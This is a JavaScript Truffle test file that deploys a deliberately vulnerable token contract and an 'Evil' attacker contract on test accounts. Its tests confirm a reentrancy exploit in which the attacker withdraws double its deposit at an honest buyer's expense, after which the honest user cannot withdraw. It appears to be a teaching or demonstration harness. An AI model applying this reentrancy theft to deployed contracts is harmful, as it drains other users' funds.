const VulnerableCoin = artifacts.require("VulnerableCoin");
const Evil = artifacts.require("Evil");

describe('Evil', function() {
  let primaryAddress, secondaryAddress, vulnerableCoin, evil;
  let normalBuyAmount = new web3.BigNumber(web3.toWei(3));
  let evilBuyAmount = new web3.BigNumber(web3.toWei(2));

  before(function(done) {
    primaryAddress = null;
    secondaryAddress = null;
    vulnerableCoin = null;
    evil = null;

    web3.eth.getAccounts(function(err, res) {
      let vulnerableFuture, evilFuture;
      primaryAddress = res[0];
      secondaryAddress = res[1];
      vulnerableFuture = VulnerableCoin.new({from: primaryAddress});
      evilFuture = vulnerableFuture.then((contract) => {
        vulnerableCoin = contract;
        return Evil.new(vulnerableCoin.address, {from: primaryAddress});
      });

      evilFuture.then((contract) => {
        evil = contract;
        done();
      });
    });
  });

  it("should make evil contract target the vulnerable contract", function(done) {
    const futureTarget = evil.targetContract.call();
    futureTarget.then((res) => {
      assert.equal(vulnerableCoin.address, res);
      done();
    });
  });

  it("should pay the vulnerable contract from a regular account", function(done) {
    const amountSent = normalBuyAmount;
    const futureNormalBuy = vulnerableCoin.buy.sendTransaction({
        from: secondaryAddress,
        to: vulnerableCoin.address,
        value: amountSent
    });
    futureNormalBuy.then( (result) => {
      const vcBalance = web3.eth.getBalance(vulnerableCoin.address);
      assert.equal(vcBalance.valueOf(), amountSent.valueOf(), "Did not get what we sent");
      done();
    });

  });

  it("should pay the vulnerable contract from evil contract", function(done) {
    const amountSent = evilBuyAmount;
    const futureEvilBuy = evil.enter.sendTransaction(evilBuyAmount, {
      from: primaryAddress,
      to: evil.address,
      value: amountSent
    });
    futureEvilBuy.then((result) => {
      const vcBalance = web3.eth.getBalance(vulnerableCoin.address);
      const eBalance = web3.eth.getBalance(evil.address);
      const expectedTotal = normalBuyAmount.add(amountSent);
      assert.equal(eBalance.valueOf(), 0, "Ether still found in evil contract");
      assert.equal(vcBalance.valueOf(), expectedTotal.valueOf(), "Not all ether are vulnerable contract");
      done();
    });
  });

  it("should withdraw double the amount deposited due to one reentrance", function(done) {
    const futureEvilWithdraw = evil.exit.sendTransaction({
      from: primaryAddress,
      to: evil.address,
      value: 0,
      gas: 3000000
    });
    futureEvilWithdraw.then( (result) => {
      // Because we withdraw the evil amount twice. Second time is at the expense at the normal buyer
      const amountLeft = normalBuyAmount.sub(evilBuyAmount);
      const amountEvil = evilBuyAmount.mul(2);
      const vcBalance = web3.eth.getBalance(vulnerableCoin.address);
      const eBalance = web3.eth.getBalance(evil.address);
      assert.equal(vcBalance.valueOf(), amountLeft.valueOf(), "Improper amount of ether left in vulnerable contract");
      assert.equal(eBalance.valueOf(), amountEvil.valueOf(), "Improper amount of ether found in evil contract");
      done();
    });
  });

  it("should not be able to let normal user withdraw", function(done) {
    const futureNormalWithdrawAfterTheft = vulnerableCoin.withdraw.sendTransaction({
      from: secondaryAddress,
      to: vulnerableCoin.address,
      value: 0
    });
    futureNormalWithdrawAfterTheft.then( (result) => {
      assert.fail("withdrawal after theft should not work");
    }, (error) => {
      console.log(error);
      done();
    });
  });
});